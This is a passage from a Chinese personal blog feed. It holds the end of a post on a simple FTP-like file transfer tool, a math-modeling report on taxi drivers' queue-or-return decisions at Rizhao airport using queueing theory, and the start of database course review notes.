class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h3><p>这个简单文件传输器是真的简单，基本上还是点对点的下载，只是我想尝试模拟FTP协议，但是发现如果用py开启这个协议，实验完全就是协议的工作了，这个文件传输器就变成了协议开启器。</p><p>在权衡之后，我采用了在服务器端读取设置的共享文件夹的文件名，并将其写成一个文件，客户端通过下载该文件可以实现对其他文件的可知。</p><p>当我在第二天一开始，把这个代码写完时，我以为我接下来的任务会很轻松然后………..</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训记录 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模：综合选拔题</title>
      <link href="/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/"/>
      <url>/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/</url>
      
        <content type="html"><![CDATA[<h2 id="数学建模：综合选拔题"><a href="#数学建模：综合选拔题" class="headerlink" title="数学建模：综合选拔题"></a>数学建模：综合选拔题</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>随着我国航空工业技术的发展和人民生活水平的不断提高，我国民用航空业发展迅速，在可预见的未来伴随着国产大飞机的逐步投产交付，全国各地将兴建起一批新机场，同时机场的旅客吞吐量不断攀升，旅客离港时出租车是机场重要的散客渠道之一。</p><p>由于不同时空，机场规模不同，航班载客数量等做多方面存在差距，如何解决离港出租车排队等待离港的判断问题的研究具有深远意义。本文针对日照市机场，从出租车司机收益最大的角度出发，给出该机场出租车司机的选择方案模型，并分析模型的合理性和对相关因素的依赖性。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>关键字： 排队论 费用决策 数据处理 客流集散特性</p><p>[TOC]</p><h3 id="一、问题重述："><a href="#一、问题重述：" class="headerlink" title="一、问题重述："></a>一、问题重述：</h3><p>根据统计，多数乘客到达机场后，都会将市区作为目的地。而出租车因其方便快捷而备受出港旅客青睐。在今年数据中在同时拥有城市内轨道交通，出租车，机场大巴等出行方式的特大机场如首都机场，通过出租车进行的人员集散仍然十分可观。在出行选择较为单一的中小型机场中，出租车仍作为主要旅客集散方式。</p><p>同时，对于出租车司机，出港旅客也是一个巨大的客户来源。但是，一般来讲，国内机场离城市中心比较远，想要在机场承接客流量，出租车司机往往会面临在机场等待还是回城市中心的选择:</p><p>在机场载客返回。由于国内机场多数采用进站客流与出站客流分离的规划思想使得出租车司机想要在到达机场后载客，需要按照“先来后到”的顺序进入指定“蓄车池”等待，等待时间则取决于到港乘客多少、蓄车池数量以及排队出租车的数量，这就需要司机付出一定的时间成本。</p><p>空载返回市区接客。出租车司机付出空载费用（多余的油耗、时间等）以及潜在客户收益，选择承接城区稳定的客流量来源。</p><p>在整个问题中最为影响司机决策判断的应为时间成本，即损失时间内可获得的经济效益</p><h3 id="二、模型假设与符号说明："><a href="#二、模型假设与符号说明：" class="headerlink" title="二、模型假设与符号说明："></a>二、模型假设与符号说明：</h3><h4 id="2-1模型假设"><a href="#2-1模型假设" class="headerlink" title="2.1模型假设"></a>2.1模型假设</h4><p>根据题意进行如下假设</p><p>（1）假设乘客在机场乘车需经历排队过程而非完全随机。</p><p>（2）不同时间段到达航班数量不同，视为不同变量。</p><p>（3）忽略国内航班与国际航班及不同客机型号载客量的差异。</p><p>（4）忽略时令导致的航班时刻变化，将全年某一航班到达时间视为相同。</p><p>（5）忽略航班取消，晚点等不可抗力影响。</p><p>（6）假设出租车司机只接待从市中心到机场与从离开机场的乘客。</p><p>（7）决策的选择仅考虑经济因素，忽略个人倾向等其他因素。</p><h4 id="2-2符号说明"><a href="#2-2符号说明" class="headerlink" title="2.2符号说明"></a>2.2符号说明</h4><table><thead><tr><th>符号</th><th>含义</th><th>单位</th></tr></thead><tbody><tr><td>Q</td><td>模型决策变量，根据所得Q值进行决策</td><td></td></tr><tr><td>N（t）</td><td>排队车辆数目</td><td>辆</td></tr><tr><td>L</td><td>机场到市中心距离</td><td>千米</td></tr><tr><td>R</td><td>市区半径</td><td>千米</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps1.jpg"></td><td>司机等待载客预期收益</td><td>元</td></tr><tr><td>T</td><td>等待载客的排队时间</td><td>小时</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps2.jpg"></td><td>出租车司机的平均时薪</td><td>元</td></tr><tr><td>k</td><td>航班的平均载客数</td><td>人</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps3.jpg"></td><td>车辆接受服务的平均时间</td><td>秒</td></tr><tr><td>λ</td><td>单位时刻出租车到达的数量</td><td>辆</td></tr><tr><td>c</td><td>车站的上车点数</td><td>个</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps4.jpg"></td><td>平均服务率</td><td></td></tr></tbody></table><h3 id="三、问题分析："><a href="#三、问题分析：" class="headerlink" title="三、问题分析："></a>三、问题分析：</h3><p>为充分分析决策的影响因素及其机理，我们可以将影响出租车司机决策的因素简单估计成，在机场选择留下等待送客和选择在市区拉客各自参生的的预期利润。   </p><p>综上所述我们可以将司机所作出的决策，所产生结果下分为两个部分</p><table><thead><tr><th></th><th>司机是否进行排队等待</th><th>空载或载客</th></tr></thead><tbody><tr><td>1</td><td>是</td><td>全程载客</td></tr><tr><td>2</td><td>否</td><td>空载返回</td></tr></tbody></table><p>一、排队等候，通过排队车辆数，航班到站时间等情况估算等候的时间成本，并结合载客回市区的收益得出采取此决策的预期利润。</p><p>二、空载返回,将空跑损耗作为成本，估计返回节省下的等候时间在市区拉客产生的收益，同样地可以给出采取空载返回能够顺利载客情况下，决策的预期利润。</p><p>三、假设在空载返回后，能够立刻拉客，在市区等待载客的时间能够忽略不计。</p><p>在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。机场的出租车载客收益与载客的行驶里程有关，乘客的目的地有远有近，但总体保持在市区范围内。</p><h3 id="四、样例分析："><a href="#四、样例分析：" class="headerlink" title="四、样例分析："></a>四、样例分析：</h3><p>以日照机场为例，由于学校所在地为日照，通过日照本地宝等平台对日照机场部分信息进行了收集处理。日照机场主要运营国内航向到站时间集中于上午九时至晚九时，出站时间为上午十时至晚二十二时。</p><p>统计结果如下图所示：</p><center><img src=".\数学建模国赛选拔\wps5.jpg" style="zoom:80%;" /> </center><center>图3-1 日照国际航空港到站航班频率分布图</center><center><img src=".\数学建模国赛选拔\wps6.jpg" style="zoom:80%;" /> </center>图4-2 日照市国际航空港离港航班时刻统计图<p>显而易见的是，一天之内乘客到站时间并不是均匀分布，而是集中于几个时间段内，所以在不同时间情况下，司机做出决策应不同。</p><p>同时我们可以查询到，日照市机场大巴发车时刻表，根据相应数据做出折线图如下:</p><center><img src=".\数学建模国赛选拔\wps7.jpg" style="zoom:80%;" /> </center><center>图4-3 日照市机场大巴发车时刻表</center>日照市机场大巴发车时间安排集中于下午十三时至十五时与晚十七时至20时，结合航班到站时间发现，机场大巴到达时间相较于航班抵达时间高峰有一定迟滞性。结合实际情况，由于乘客下机后需办理行李提取、海关检疫等一系列手续，故乘客离开的高峰需顺延1至2小时。故出租车运营时间将有一定滞后性。<p>为了方便决策方案的给出，根据出港人流量和机场大巴时间安排的高峰、低谷，并结合实际情况将一天分为0至9时;9至13时;14时至15时;15至17时，17至20时；21时至0时数个时间段，具体划分方案如下:</p><p>0至9时与20时至0时，机场无航班进出不做考虑。9至13时与15至17时存在航班，机场大巴尚未开行，出租车运送乘客占比较高，14时至15时与17至20时机场大巴开行时间段，出租车运送乘客占比较低。</p><p>在司机接送旅客收入方面：日照市出租车执行的收费标准为：SP0+M(s)（S-2），即2公里内为起步价SP0， 超过两公里部分按里程的不同进行阶梯计价。</p><center><img src=".\数学建模国赛选拔\wps8.jpg" style="zoom:80%;" /> </center><center>图4-4 日照市机场与市区分布图</center>同时国内机场普遍离城市中心比较远，以日照市为例，日照市机场位于市区西南方向，距市区25至30公里。<h3 id="五、决策模型建立："><a href="#五、决策模型建立：" class="headerlink" title="五、决策模型建立："></a>五、决策模型建立：</h3><p>本题为决策问题,我们可以建立模型对司机进行决策的过程进行描述。</p><h4 id="5-1目标函数的建立"><a href="#5-1目标函数的建立" class="headerlink" title="5.1目标函数的建立"></a>5.1目标函数的建立</h4><p>设Z为司机通过决策也已获得的利润，可将某种决策下的利润P（profit）表示为:</p><center><img src=".\数学建模国赛选拔\wps9.jpg" style="zoom:100%;" /> </center>Q为决变量，决定了采取的决策，结合现实状况，出租车司机不可能同时空车返回市区和等待，Q的取值即为[0,1],若Q取1，代表等选择等待载客，Q=0则代表空载返回。P1、P2分别代表了(A)、(B)两方案的利润。如此规定后,便可以通过目标函数对利润Z求取最大值即可。<center><img src=".\数学建模国赛选拔\wps10.jpg" style="zoom:100%;" /></center>#### 5.2所有可能情况的阐释<p>由此可以得出影响司机决策的因素有:载客的利润期望、空载返回的时间以及消耗、市区载客的预期利润。对这些因素继续进行具体分析，可以发现司机的决策实际上由多个要素共同决定:排队车辆数N（t）、返回路程S，收费标准M(S)、当前时间段内抵达机场的航班数量N、等待载客的时间成本（TS）。其中，排队车辆数M和机场返回市区乘客数量N，决定了等待时间T，返回路程和收费标准共同影响了载客利润P1。另外返回路程还制约了空载损耗的大小，收费标准还决定了司机在市区的收益。</p><h5 id="5-2-1基于排队载客的模型建立："><a href="#5-2-1基于排队载客的模型建立：" class="headerlink" title="5.2.1基于排队载客的模型建立："></a>5.2.1基于排队载客的模型建立：</h5><p>基于排队载客P1，其收益为收入减去成本，此处的成本包括时间成本及载客过程中油耗和过路费等。在一般情况下过路费包含在乘客付款中可以忽略不计。</p><center><img src=".\数学建模国赛选拔\wps11.jpg" style="zoom:100%;" /> </center>由于阶梯计价的计价策略，载客收入W1为分段函数，在起步距离S0以内部分收费SP0，以外部分采取阶梯计价可表示为：<center><img src=".\数学建模国赛选拔\wps12.jpg" style="zoom:100%;" /> </center>在此表达式中等待载客的时间成本TS1，可以看做等待时间与单位时间下的平均收益的比值。<p>设司机的单位时间平均收入为ρ，T为等候载客的时间。</p><center><img src=".\数学建模国赛选拔\wps13.jpg" style="zoom:100%;" /> </center>再此基础上，出租车在机场排队可能等待时间T，取决于不同时段航班的到达规律、出租车的排队数量。由于不同时间阶段下，等待载客的时间T存在较大波动<p>在前文的样例分析中，可知不同时间段乘坐公交车的乘客数，占航班总旅客数的占比是不同的,不妨设在在无机场大巴时总客流量与乘坐出租车旅客数比例为C1，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2</p><center><img src=".\数学建模国赛选拔\wps14.jpg" style="zoom:100%;" /> </center><img src=".\数学建模国赛选拔\wps15.jpg" style="zoom:100%;" />表示机场一时间阶段内抵达的乘客，由假设中设忽略国内航班与国际航班及不同客机型号载客量的差异，设k为航班的平均载客数，有如下判断：<center><img src=".\数学建模国赛选拔\wps16.jpg" style="zoom:100%;" /> </center>**等待时间T的确定：**<p>旅客乘坐飞机到达空港客运交通枢纽的集聚规律服从泊松分布[1],设出租车到达率同样服从Poisson分布，由排队论可知，当输入过程为泊松流时，车辆到达的时间间隔服从负指数分布</p><p>平均服务率，设置机场存在c个上车点，每辆车接受服务的平均时间记为µ0，接受服务的时间服从正态分布。其中每辆车接受服务的平均时间记为µ0,可视为常量。</p><p>当乘车人数时可以认为乘车人数足够多，只需要考虑每辆车的接受服务时间</p><center><img src=".\数学建模国赛选拔\wps22.jpg" style="zoom:100%;" /> </center>N0表示每小时内有多少辆车接受服务<p>当乘车人数时,在排队过程中，必然出行在队首车辆会进入等待，设此时的额外等待时间为，</p><center><img src=".\数学建模国赛选拔\wps25.jpg" style="zoom:100%;" /> </center>则平均服务率为<center><img src=".\数学建模国赛选拔\wps26.jpg" style="zoom:100%;" /></center>当成等待区乘客数量稳定时，由排队论可知，系统此时满足M/M/C/∞/∞/FCFS的状况。它表示：在a个服务台与先到先服务前提下，车站蓄车池容量无限与到站客源无限，出租车到达相互独立，且服从参数为λ的泊松分布；同时，出租车的服务时间服从参数为µ的负指数分布。其中，λ表示单位时刻出租车到达的数量，Ε(t)表示系统的平均服务率，即单位时间内离开排队池的出租车数量。<p>则服务强度为：</p><center><img src=".\数学建模国赛选拔\wps29.jpg" style="zoom:100%;" /> </center>系统平均等待车辆数LQ<center><img src=".\数学建模国赛选拔\wps30.jpg" style="zoom:100%;" /> </center>由上式：令n`=n-c对应公式经化简可得：<center><img src=".\数学建模国赛选拔\wps31.jpg" style="zoom:100%;" /> </center>蓄车池空闲概率P0:<center><img src=".\数学建模国赛选拔\wps32.jpg" style="zoom:100%;" /> </center>由Little公式，得司机平均等待时间为:<center><img src=".\数学建模国赛选拔\wps33.jpg" style="zoom:100%;" /> </center>则每辆出租车的逗留时间为：<center><img src=".\数学建模国赛选拔\wps34.jpg" style="zoom:100%;" /> </center>##### 5.2.2基于返回拉客的模型建立:<p>基于返回拉客P2，其收益为收入减去成本，此处的成本包含，由机场返回市中心的折算时间成本，空载返回产生油耗等。</p><p>假设司机选择空载返回市区接客，假设市区乘客数量足够，即不需要在市区等待乘客，此时预期能获得的收益W2为选择在飞机场排队载客时的时间成本。</p><center><img src=".\数学建模国赛选拔\wps35.jpg" style="zoom:100%;" /> <center>由于在不同城市，城市规划及市区发展的现实不同，不妨设从机场到达市中心的距离为L，城区半径为r,则任一乘客搭乘出租车返回市区的距离S服从N(L,r2),所以可设<p>为空载返回时的损失。故出租车从机场载客返回市区总收益为：节约排队载客的时间成本与空载返回产生油耗过路费等损耗与返程中的时间成本之差。</p><p>综上所述：</p><center><img src=".\数学建模国赛选拔\wps37.jpg" style="zoom:100%;" /> </center>折算的时间成本TS2可以表示为： <p>其中V为出租车行驶的平均速度，ρ为司机的单位时间平均收入 </p><center><img src=".\数学建模国赛选拔\wps40.jpg" style="zoom:100%;" /> <center><h4 id="5-3决策模型："><a href="#5-3决策模型：" class="headerlink" title="5.3决策模型："></a>5.3决策模型：</h4><p>从模型中得到的Q即为推荐司机选择排队的概率，其取值范围为[0, 1]。Q越大，更推荐司机选择在排队区等待，反之则是空载，具体如下： </p><p>(1)，司机最好选择在排队区等待，此时排队预期平均收益高于空载返回的预期收益。</p><p>(2) P &lt; 0.5，司机最好选择空载返回，此时排队预期平均收益低于空载返回的预期收益。</p><h3 id="六、选择模型的检验与合理性分析"><a href="#六、选择模型的检验与合理性分析" class="headerlink" title="六、选择模型的检验与合理性分析"></a>六、选择模型的检验与合理性分析</h3><p>在前面的样例分析阶段的研究中，探讨了日照市机场的相关信息，接下来将以日照市为例对模型进行检验和合理性分析。</p><p>中心商务区（CBD）是指一个城市里主要商业活动进行的地区同时也是市中心，在日照市我们可以将万达及华润万象汇所在的区域定义为日照市的中心商务区。</p><center><img src=".\数学建模国赛选拔\wps43.jpg" style="zoom:100%;" /> </center><center>图6-1 出租车路线规划图</center><center><img src=".\数学建模国赛选拔\wps44.jpg" style="zoom:100%;" /> </center>通过百度地图可查，由日照山字河国际机场到市中心依路线不同，其距离为29±3公里，即如此可以确定路程L=29，市区范围R=3，返回市区的平均时间t约为41分钟。并结合收费标准得到载客回市区收益W1，带入数据得。<center>W1=57.62</center>考虑到空载和载人对汽车油耗影响较小，可以忽略不计，由于日照市出租车车型并不统一，此处采用可查数据中出现的大众捷达车型，油耗为5.7L/100km，目前国内油价为8.43元/L。可以计算：<center><img src=".\数学建模国赛选拔\wps45.jpg" style="zoom:100%;" /> </center>同时通过找工易平台获取信息为，山东省出租车司机的平均薪资为11479元/月，出租车司机工作时间为11个小时，每个月休息2天，如此可以推算日照市出租车司机在市中心每小时的利润为:<center><img src=".\数学建模国赛选拔\wps46.jpg" style="zoom:100%;" /> </center>可以计算出租车司机空载返回时的时间成本为： <p>同时日照市机场作为中小型机场，其到站客流波动较大，结合上文分析可粗略估计在无机场大巴时总客流量与乘坐出租车旅客数比例为C1=0.32，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2=0.22，结合航班到站时间有：</p><table><thead><tr><th></th><th>9至13时</th><th>13至15时</th><th>15至16时</th><th>16至17时</th><th>17至18时</th><th>18至20时</th><th>20至21时</th><th>21时至次日9时</th></tr></thead><tbody><tr><td>平均打车数</td><td>56</td><td>27.5</td><td>0</td><td>148</td><td>66</td><td>11</td><td>64</td><td>0</td></tr><tr><td>平均服务率</td><td>80</td><td>43.64</td><td></td><td>80</td><td>80</td><td>70.9</td><td>80</td><td></td></tr></tbody></table><p>表6-1 日照市国际机场不同时间段的平均打车数即平均服务率统计表</p><p>由山东省公共数据公开网可以查询到日照市交通运输局发布的日照市市直出租车信息汇总，日照市市区共有出租车969辆。由于部分关键数据缺失，这里采用其他城市数据进行估算，设λ=42，为90s，设日照市机场服务台数为2。</p><p>平均服务率可同时求出，以标记正在上表中</p><p>当在13-16时，18至20时，21时至次日9时三个时间段内，乘客数量小于到达的车辆数量，则平均服务率为以13-16时为例</p><p>E(t)=43.64带入公式</p><center><img src=".\数学建模国赛选拔\wps50.jpg" style="zoom:100%;" /> <center><center><img src=".\数学建模国赛选拔\wps51.jpg" style="zoom:100%;" /> </center><center><img src=".\数学建模国赛选拔\wps52.jpg" style="zoom:100%;" /> </center>此时Wq远大于，可以忽略不计<center><img src=".\数学建模国赛选拔\wps54.jpg" style="zoom:100%;" /> <center><p>此时，结果为负，=47.902，应选择空载返回市区。</p><p>同理当其余时间段，乘客数量大于到达的车辆数量，则平均服务率为<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml9260\wps57.jpg" alt="img">，易证此时P1&gt;P2应选择排队载客。</p><p>综上所述对于日照市机场有以下判断：</p><table><thead><tr><th align="center">时间</th><th align="center">13-16时，18至20时，21时至次日9时</th><th align="center">9至13时，16至18时，20至21时</th></tr></thead><tbody><tr><td align="center">司机选择</td><td align="center">返回拉客</td><td align="center">等待载客</td></tr></tbody></table><p>表6-2 针对日照市特点下不同时间段预测数据</p><p>在不同时间阶段下，模型能够做出不同判断，保证出租车司机的利益最大化，可以证明模型具有合理性。</p><h3 id="七、-模型改进方向"><a href="#七、-模型改进方向" class="headerlink" title="七、 模型改进方向"></a>七、 模型改进方向</h3><p>在本题中，选择机场为中小型机场在模拟过程中航班到达量不同时间段内，波动较大。同时在模型检验和合理性分析阶段，因为部分条件获取难度较大采取使用其他数据进行估计，并不能保证完全准确。在估计机场乘客数的推断中，在模型建立之初故意选择性的忽视了不同航班载客量的差异，将其视为相同参数，若将其进行妥善分析能进一步提高模型的准确率与可靠性。</p><p>参考文献</p><p>[1]何汉.大型空港客运交通枢纽客流集散规律研究.铁道运输与经济. 2019.04.17</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习资料整理</title>
      <link href="/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库复习资料整理"><a href="#数据库复习资料整理" class="headerlink" title="数据库复习资料整理"></a>数据库复习资料整理</h1><p>[TOC]</p><h2 id="第1章-数据库概述"><a href="#第1章-数据库概述" class="headerlink" title="第1章  数据库概述"></a>第1章  数据库概述</h2><h3 id="1-1-数据与信息"><a href="#1-1-数据与信息" class="headerlink" title="1.1 数据与信息"></a>1.1 数据与信息</h3><p>**数据(Data)**是描述事物的符号记录，是信息的符号表示或载体，也是数据库中存储的基本对象，数据描述现实世界中各种具体事物或抽象概念的、可存储并具有明确意义的符号记录。</p><p>数据本身无意义，具有客观性，经过解释才能表示一定的意义。数据的含义是对数据的解释，称为数据的语义，数据与其语义是不可分的</p><p><strong>信息（Information）</strong>是数据的内涵，是数据的语义解释。</p><h3 id="1-2-数据管理技术的发展"><a href="#1-2-数据管理技术的发展" class="headerlink" title="1.2 数据管理技术的发展"></a>1.2 数据管理技术的发展</h3><h4 id="人工管理阶段"><a href="#人工管理阶段" class="headerlink" title="人工管理阶段"></a>人工管理阶段</h4><blockquote><p>时期:40年代中–50年代中<br>应用需求：科学计算          硬件水平：无直接存取存储设备     软件水平：没有操作系统      处理方式：批处理</p><p>人工管理阶段的特点：数据不保存，应用程序管理数据，数据不共享，数据不具有独立性</p></blockquote><h4 id="文件管理阶段"><a href="#文件管理阶段" class="headerlink" title="文件管理阶段"></a>文件管理阶段</h4><blockquote><p>时期:50年代末–60年代中<br>应用需求:科学计算、管理   硬件水平:磁盘、磁鼓   软件水平:有文件系统      处理方式:联机实时处理、批处理</p><p>文件管理阶段的特点：数据以文件的形式长期保存在外存储器中数据独立性差，由文件系统对数据进行管理，数据共享性差，冗余度大，数据独立性差。</p></blockquote><h4 id="数据库管理阶段"><a href="#数据库管理阶段" class="headerlink" title="数据库管理阶段"></a>数据库管理阶段</h4><blockquote><p>时期:60年代末以来<br>背景:大规模管理  硬件背景:大容量磁盘 软件背景:有数据库管理系统  处理方式:联机实时处理,分布处理,批处理</p><p>数据库管理系统阶段的特点： 数据结构化，数据的共享性高，冗余度低，易扩充，数据独立性高，数据由DBMS统一管理和控制</p></blockquote><h3 id="1-3-数据库系统的基本概念"><a href="#1-3-数据库系统的基本概念" class="headerlink" title="1.3 数据库系统的基本概念"></a>1.3 数据库系统的基本概念</h3><p>**数据库(Database，DB)**是长期储存在计算机内、有组织的、可共享的大量数据的集合</p><blockquote><p>数据库的基本特征<br>数据按一定的数据模型组织、描述和储存，冗余度较小，数据独立性较高，易扩展，可为各种用户共享</p></blockquote><p>**数据库管理系统(DataBase Management System, DBMS)**：是数据库系统的核心，位于用户与操作系统之间的一层数据管理软件</p><blockquote><p>DBMS的主要功能包括：<br>数据定义功能，数据操纵功能，数据组织、存储和管理，数据库运行管理，数据库的建立和维护功能</p></blockquote><p>**数据库系统(DataBase System， DBS)**是指在计算机系统中引入数据库后的系统。</p><h3 id="1-4-数据模型"><a href="#1-4-数据模型" class="headerlink" title="1.4 数据模型"></a>1.4 数据模型</h3><h4 id="三个世界的划分"><a href="#三个世界的划分" class="headerlink" title="三个世界的划分"></a>三个世界的划分</h4><pre class="line-numbers language-none"><code class="language-none">为了把现实世界中的具体事物抽象、组织为某一DBMS支持的数据模型，首先将现实世界的事物及其联系进行特征抽取，形成信息世界的概念模型，这种模型不依赖于具体的计算机系统，然后再将概念模型转换为某一DBMS所支持的逻辑模型和物理模型。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>现实世界 现实世界即客观存在的世界</li><li>信息世界是现实世界在人们头脑中的反映，经过人脑的分析、归纳、抽象，形成信息，把这些信息进行记录、整理、归类和格式化后，就构成了信息世界。<ul><li>实体（Entity）：客观存在并且可以相互区分的事物称为实体</li><li>属性（Attribute）：实体所具有的某一特性称为属性</li><li>码（Key）：能唯一标识实体的属性或属性的组合称为码，也称为键</li><li>域（Domain）：属性的取值范围称为该属性的域</li><li>实体型（Entity Type）：用实体名及其所有属性的集合来描述同类实体，称为实体型</li><li>实体集（Entity Set）：同一类型实体的集合称为实体集</li><li>联系<ul><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则称实体集E1与实体集E2具有多对多联系，记为m:n</li></ul></li></ul></li><li>机器世界是信息世界中信息的数据化，就是将信息用字符和数值等数据表示，便于存储在计算机中，并由计算机进行识别和处理<ul><li>文件（file）：同一类记录的集合称为文件，文件是用来描述实体集的</li><li>关键字（key）：能唯一标识文件中每条记录的字段或字段集，称为记录的关键字，或者简称为键。</li></ul></li></ol><h4 id="E-R图的相关信息"><a href="#E-R图的相关信息" class="headerlink" title="E-R图的相关信息"></a>E-R图的相关信息</h4><p>概念模型是对信息世界的建模，它能方便、准确地描述信息世界中的概念。</p><p>概念模型有很多表示方法，其中最著名、最常用的是P.P.S.Chen于1976年提出的实体－联系方法，也称为实体－联系模型，该方法用E-R图来表示实体、属性以及实体间的联系。</p><blockquote><ol><li>实体用矩形表示，矩形框内写明实体名</li><li>属性用椭圆形表示，并用无向边将其与相应的实体连接起来</li><li>联系用菱形表示，菱形框内写明联系名，并用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n或m:n）</li><li>联系也可能有属性，联系的属性用椭圆形表示，并用无向边与该联系连接起来。</li><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则称实体集E1与实体集E2具有多对多联系，记为m:n。</li><li>多个实体集之间多对多联系的定义:若实体型Ej（j=1，2，…，i-1，i+1，…，n）中的给定实体，和Ei中的多个实体相联系，则Ei与E1，E2，…，Ei-1，Ei+1，…，En之间的联系是多对多的</li></ol></blockquote><h4 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a>数据模型的组成要素</h4><ul><li>数据结构：描述数据的类型、内容、性质及数据间的联系，是对系统静态特征的描述，是数据模型中最基本的部分，不同的数据模型采用不同的数据结构。</li><li>数据操作：主要描述在相应的数据结构上允许执行的操作的集合，包括操作以及有关的操作规则，是对系统动态特征的描述。对数据库的操作主要有查询和更新（插入、删除、修改）两类操作</li><li>完整性约束：主要描述数据结构内的数据及其联系所具有的制约和依存规则，用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确性、有效性和相容性。</li></ul><p>关系模型：建立在严格的数学概念基础之上，采用二维表来表示实体和实体之间的联系，是目前应用最多、最重要的一种数据模型</p><blockquote><p>关系（Relation）一个关系对应通常说的一张表。<br>元组（Tuple）表中的一行即为一个元组。（第一行除外）<br>属性（Attribute）表中的一列即为一个属性，列名即是属性名，列值即是属性值<br>域（Domain）：属性的取值范围。<br>分量：元组中的一个属性值<br>码（Key）：属性或属性的组合，能唯一确定一个元组。一个关系中可以有多个码。<br>关系模式：对关系的描述，表示为:关系名（属性1，属性2，…，属性n）</p></blockquote><h3 id="1-5-数据库系统的内部结构"><a href="#1-5-数据库系统的内部结构" class="headerlink" title="1.5 数据库系统的内部结构"></a>1.5 